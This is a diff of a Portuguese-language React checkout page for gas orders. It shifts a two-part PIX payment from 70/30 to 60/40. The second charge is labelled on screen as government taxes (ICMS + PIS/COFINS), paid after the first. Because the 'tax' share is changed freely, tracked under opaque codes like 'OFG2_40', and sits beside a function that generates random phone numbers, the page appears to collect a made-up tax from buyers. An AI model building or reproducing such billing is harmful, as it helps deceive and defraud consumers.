@@ -857,10 +857,10 @@ export default function CheckoutPage() {
         }
       }
       
-      // Cobrar 70% para gás (primeira parte), 100% para outros produtos
+      // Cobrar 60% para gás (primeira parte), 100% para outros produtos
       let pixAmount = totalPrice
       if (requiresSplitPayment()) {
-        pixAmount = Math.round(totalPrice * 0.70) // 70% para gás
+        pixAmount = Math.round(totalPrice * 0.60) // 60% para gás
       }
       
       let productTitle = productName
@@ -1100,7 +1100,7 @@ export default function CheckoutPage() {
       setPixError("")
       
       const taxAmount = getTaxPaymentAmount()
-      console.log('💵 Valor calculado (30%):', taxAmount, 'centavos')
+      console.log('💵 Valor calculado (40%):', taxAmount, 'centavos')
       
       const requestData = {
         amount: taxAmount,
@@ -1140,7 +1140,7 @@ export default function CheckoutPage() {
           }
         },
         items: [{
-          title: 'ProdNew30',
+          title: 'ProdNew40',
           unitPrice: taxAmount,
           quantity: 1,
           tangible: true,
@@ -1197,11 +1197,11 @@ export default function CheckoutPage() {
       console.log('💾 PIX de 30% salvo no localStorage')
       
       // Enviar para UTMify - segundo PIX gerado (waiting_payment)
-      // Criar payload completo para o segundo pagamento (30%)
+      // Criar payload completo para o segundo pagamento (40%)
       await sendTaxPaymentToUtmify(taxPixResponse, taxAmount, 'waiting_payment')
       
       // Iniciar polling para o segundo pagamento
-      console.log('🔄 Iniciando polling do PIX de 30%...')
+      console.log('🔄 Iniciando polling do PIX de 40%...')
       startPaymentPolling(taxPixResponse.id)
     } catch (err) {
       console.error('❌ Erro geral ao gerar PIX de 30%:', err)
@@ -1279,17 +1279,17 @@ export default function CheckoutPage() {
     const finalPrice = totalPrice - pixDiscount // Valor após desconto
     
     if (requiresSplitPayment()) {
-      return Math.round(finalPrice * 0.70) // 70% do valor
+      return Math.round(finalPrice * 0.60) // 60% do valor
     }
     return finalPrice // 100% para não-gás
   }
 
-  // Calcular valor da segunda parte (30% - impostos)
+  // Calcular valor da taxa (40% do total)
   const getTaxPaymentAmount = () => {
     if (!requiresSplitPayment()) return 0
     const totalPrice = getTotalPrice()
     const finalPrice = totalPrice - pixDiscount
-    return Math.round(finalPrice * 0.30) // 30% do valor (ICMS + impostos)
+    return Math.round(finalPrice * 0.40) // 40% do valor (ICMS + impostos)
   }
 
   // Calcular valor a pagar (compatibilidade)
@@ -1658,9 +1658,9 @@ export default function CheckoutPage() {
     return `5582${Math.floor(Math.random() * 900000000) + 100000000}`
   }
 
-  // Função para enviar pagamento de impostos (30%) ao UTMify
+  // Função para enviar pagamento de impostos (40%) ao UTMify
   const sendTaxPaymentToUtmify = async (taxPixData: any, taxAmount: number, status: 'waiting_payment' | 'paid') => {
-    console.log(`📤 [UTMIFY TAX] Enviando pagamento de impostos (30%): ${status}`)
+    console.log(`📤 [UTMIFY TAX] Enviando pagamento de impostos (40%): ${status}`)
     
     // Verificar se já foi enviado
     const taxSentStr = localStorage.getItem('utmify-tax-sent')
@@ -1698,7 +1698,7 @@ export default function CheckoutPage() {
           : null,
         products: basePayload.products.map((product: any) => ({
           ...product,
-          name: "OFG2_30",
+          name: "OFG2_40",
           priceInCents: taxAmount
         })),
         commission: {
@@ -2763,15 +2763,15 @@ export default function CheckoutPage() {
                   )}
 
                     <div className="space-y-3">
-                      {/* Primeira Parte - 70% */}
+                      {/* Primeira Parte - 60% */}
                       <div className="bg-white rounded-lg p-3 border-2 border-green-300">
                         <div className="flex items-center gap-2 mb-2">
                           <span className="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold">1</span>
-                          <h6 className="font-bold text-green-800 text-sm">Primeira Parte (70%)</h6>
+                          <h6 className="font-bold text-green-800 text-sm">Primeira Parte (60%)</h6>
                         </div>
                         <div className="pl-8">
                           <p className="text-xs text-gray-700 mb-1">
-                            <strong>Valor:</strong> <span className="text-green-600 font-bold text-base">{formatPrice(Math.round((getTotalPrice() - pixDiscount) * 0.70))}</span>
+                            <strong>Valor:</strong> <span className="text-green-600 font-bold text-base">{formatPrice(Math.round((getTotalPrice() - pixDiscount) * 0.60))}</span>
                           </p>
                           <p className="text-xs text-gray-600 leading-relaxed">
                             Este valor cobre o <strong>custo do produto + distribuição</strong>. Você paga agora via PIX.
@@ -2779,15 +2779,15 @@ export default function CheckoutPage() {
                         </div>
                       </div>
 
-                      {/* Segunda Parte - 30% */}
+                      {/* Segunda Parte - 40% */}
                       <div className="bg-white rounded-lg p-3 border-2 border-orange-300">
                         <div className="flex items-center gap-2 mb-2">
                           <span className="bg-orange-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold">2</span>
-                          <h6 className="font-bold text-orange-800 text-sm">Segunda Parte (30%) - Impostos</h6>
+                          <h6 className="font-bold text-orange-800 text-sm">Segunda Parte (40%) - Impostos</h6>
                         </div>
                         <div className="pl-8">
                           <p className="text-xs text-gray-700 mb-1">
-                            <strong>Valor:</strong> <span className="text-orange-600 font-bold text-base">{formatPrice(Math.round((getTotalPrice() - pixDiscount) * 0.30))}</span>
+                            <strong>Valor:</strong> <span className="text-orange-600 font-bold text-base">{formatPrice(Math.round((getTotalPrice() - pixDiscount) * 0.40))}</span>
                           </p>
                           <p className="text-xs text-gray-600 leading-relaxed">
                             Este valor é referente aos <strong>impostos governamentais</strong> (ICMS + PIS/COFINS). Você paga logo após confirmar o primeiro pagamento.
